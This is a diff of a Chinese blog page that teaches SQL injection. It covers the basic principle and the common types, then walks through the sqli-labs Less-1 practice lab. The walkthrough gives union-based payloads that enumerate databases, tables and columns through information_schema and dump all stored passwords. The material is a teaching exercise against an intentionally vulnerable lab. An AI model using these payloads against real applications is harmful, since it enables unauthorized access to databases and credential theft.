@@ -4,7 +4,7 @@
 <head>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- Title -->
     
-    <title>Category - DV.K</title>
+    <title>about - DV.K</title>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
     <meta name="keywords" content="DV.K CTFer" />
@@ -61,17 +61,17 @@
                 <section id="content">
                     <div class ="post_page_title_img" style="background-image: url(https://cdn.dvkunion.cn/blog/20190506/vhicMCTjS2F2.jpg);" ></div>
                     <hr>
-                    <h1>Web-SQL</h1>
-<hr>
+                    <h1 id="Web-SQL"><a href="#Web-SQL" class="headerlink" title="Web-SQL"></a>Web-SQL</h1><hr>
 <center><small>2019-5-6</small></center>
+
 <p>这周开始 SQL注入 的学习和总结，从基础部分到深入的理解各种注入手段。</p>
 <center><small>2019-5-14</small></center>
-<p>一个重要的数据库:information_schema<br>
-三张重要的表:schemata、tables、columns</p>
+
+<p>一个重要的数据库:information_schema<br>三张重要的表:schemata、tables、columns</p>
 <center><small>华丽的分割线</small></center>
+
 <hr>
-<h3><b>0x01- - 什么是SQL注入<b></b></b></h3>
-<p>在动态的Web应用中，数据库是不可缺少的元素之一。动态类的网站通常需要动态脚本在后台进行不断的数据库操作，将数据从数据库中取出或是修改。进行这种操作的脚本通常会构造出一个符合 SQL语法 的查询语句，然后通过数据库-脚本语言的插件，对数据库进行增删改查的操作。</p>
+<h3 id="0x01-什么是SQL注入"><a href="#0x01-什么是SQL注入" class="headerlink" title="0x01- - 什么是SQL注入"></a><b>0x01- - 什么是SQL注入<b></b></b></h3><p>在动态的Web应用中，数据库是不可缺少的元素之一。动态类的网站通常需要动态脚本在后台进行不断的数据库操作，将数据从数据库中取出或是修改。进行这种操作的脚本通常会构造出一个符合 SQL语法 的查询语句，然后通过数据库-脚本语言的插件，对数据库进行增删改查的操作。</p>
 <p>SQL注入，就是在脚本语言构造查询语句的时候，通过传入一些特殊的字符或是特定的数据库函数参数，从而实现对数据库的任意操作，达到攻击目的。</p>
 <p>SQL语句具有灵活、通用的优点，所以通常动态SQL语句都是在执行的过程中创建的。在这个过程中如果没有对一些敏感函数和特殊符号进行过滤，构造出的SQL语则会可能带有强力的攻击性。</p>
 <p>手画一幅图来更好的表达我的意思：</p>
@@ -80,8 +80,7 @@
 <p>练习SQL注入时，可以通过LAMP环境搭建一个练习靶场，如sqli-labs、dvwa等等。</p>
 <p>放一个 Ms17010实验室的在线SQLi-labs环境，在这里感谢大佬贡献的练习靶机:</p>
 <p><a href="http://43.247.91.228:84/" target="_blank" rel="noopener">http://43.247.91.228:84/</a></p>
-<h3><b>0x02- - SQL注入的原理<b></b></b></h3>
-<p>首先我们看一个正常的SQL查询语句：</p>
+<h3 id="0x02-SQL注入的原理"><a href="#0x02-SQL注入的原理" class="headerlink" title="0x02- - SQL注入的原理"></a><b>0x02- - SQL注入的原理<b></b></b></h3><p>首先我们看一个正常的SQL查询语句：</p>
 <p><code>select * from users where id = $id</code></p>
 <p>正常的操作下，$id 是我们输入的一个变量，当我们输入 id=1 时，数据库会带入这条SQL语句 进行查询 id=1 的用户信息，并将查询结果反馈给我们。</p>
 <p>当我们进行攻击时，我们输入 $id=1 and 1=1 ,没有过滤的情况下，数据库会带入 $id 内所有的参数进行查询，查询语句则变成了这样：</p>
@@ -90,24 +89,19 @@
 <p><code>select * from users where id = 1 and 1=2</code></p>
 <p>此时 1=2为假，与逻辑下 查询结果为假，因此查询不到任何数据，返回结果为空。</p>
 <p>据此即可判断，此处存在SQL注入漏洞，我们可以构造更多的 payload 进行攻击。</p>
-<h3><b>0x03- - SQL注入的分类<b></b></b></h3>
-<p>常见的注入攻击有：报错注入、盲注、Union注入等等。</p>
+<h3 id="0x03-SQL注入的分类"><a href="#0x03-SQL注入的分类" class="headerlink" title="0x03- - SQL注入的分类"></a><b>0x03- - SQL注入的分类<b></b></b></h3><p>常见的注入攻击有：报错注入、盲注、Union注入等等。</p>
 <p>按照工具：手动注入、工具注入。</p>
 <p>进阶：宽字节注入、时间注入、堆叠注入、二次注入、cookie注入、base64注入、XFF注入。</p>
 <p>说到底，SQL注入是在利用输入过滤不严谨和数据库的SQL语句特性进行攻击。所以对于不同的数据库攻击的方式也不完全相同。这里大多数例子都以 mysql 数据库为例。</p>
 <p><b> Union 注入</b></p>
 <p>通过 SQL语法 中的 union select 联合查询进行注入。</p>
-<h3><b>0x04- - SQL注入练习<b></b></b></h3>
-<p>练习部分主要以sqli-labs为主，外加一些CTF平台的经典题目。</p>
-<h4><font color="blue">sqli-labs</font><br></h4>
-<p><b>Less-1:GET-Error Based-String quotes - String</b></p>
-<p>第一题开头应该是最简单的，首先带入'单引号进行fuzz测试</p>
+<h3 id="0x04-SQL注入练习"><a href="#0x04-SQL注入练习" class="headerlink" title="0x04- - SQL注入练习"></a><b>0x04- - SQL注入练习<b></b></b></h3><p>练习部分主要以sqli-labs为主，外加一些CTF平台的经典题目。</p>
+<h4 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a><font color="blue">sqli-labs</font><br></h4><p><b>Less-1:GET-Error Based-String quotes - String</b></p>
+<p>第一题开头应该是最简单的，首先带入’单引号进行fuzz测试</p>
 <p><img src="https://cdn.dvkunion.cn/blog/20190514/mWNCxs98K1AU.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/mWNCxs98K1AU.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
-<p>发现报错，并切后面出现了 limit 字样，说明后面存在多余的语句，我们需要注释掉后面的语句才能运行。<br>
-传参 id=1' order by 1%23 判断列数，在4时报错</p>
+<p>发现报错，并切后面出现了 limit 字样，说明后面存在多余的语句，我们需要注释掉后面的语句才能运行。<br>传参 id=1’ order by 1%23 判断列数，在4时报错</p>
 <p><img src="https://cdn.dvkunion.cn/blog/20190514/NB1YtWkMUYxo.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/NB1YtWkMUYxo.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
-<p>说明一共存在三列，我们开始构造union查询：<br>
-id=-1' union select 1,2,3%23</p>
+<p>说明一共存在三列，我们开始构造union查询：<br>id=-1’ union select 1,2,3%23</p>
 <p><img src="https://cdn.dvkunion.cn/blog/20190514/kImfWSWEjnlr.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/kImfWSWEjnlr.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>得到了数据对应的列的位置，我们在这几个位置使用union对数据进行其他数据库查询即可：</p>
 <p>id=-1%27%20%20union%20select%201,user(),3%23 查询数据库用户名</p>
@@ -118,17 +112,17 @@ id=-1' union select 1,2,3%23</p>
 <p>id=-1%27%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata%20%23</p>
 <p><img src="https://cdn.dvkunion.cn/blog/20190514/bign3RmOAjcc.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/bign3RmOAjcc.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>然后我们可以利用 mysql中的一个特殊数据库进行爆表：</p>
-<p>id=-1' union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database()%23</p>
+<p>id=-1’ union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database()%23</p>
 <p>group_concat可以将内容按照要求的以默认的逗号打印出来，占一列的值。</p>
 <p><img src="https://cdn.dvkunion.cn/blog/20190514/KVmUo4gN7P9t.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/KVmUo4gN7P9t.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>爆出了表名，我们可以继续查询表内字段名：</p>
-<p>id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='emails'%23</p>
+<p>id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’emails’%23</p>
 <p><img src="https://cdn.dvkunion.cn/blog/20190514/nyVNYaN18SFr.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/nyVNYaN18SFr.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>同样也可以对users表进行查询：</p>
-<p>id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'%23</p>
+<p>id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’%23</p>
 <p><img src="https://cdn.dvkunion.cn/blog/20190514/TLBktVJWYTJd.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/TLBktVJWYTJd.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>发现存在关键字段password,我们去爆出所有的password</p>
-<p>id=-1' union select 1,2,group_concat(password) from security.users %23</p>
+<p>id=-1’ union select 1,2,group_concat(password) from security.users %23</p>
 <p><img src="https://cdn.dvkunion.cn/blog/20190514/i6l6StGSBHHz.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/i6l6StGSBHHz.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>得到所有人的密码。</p>
 <p>这样是通过了Union进行的注入，同样这题也可以通过报错注入得到结果。</p>
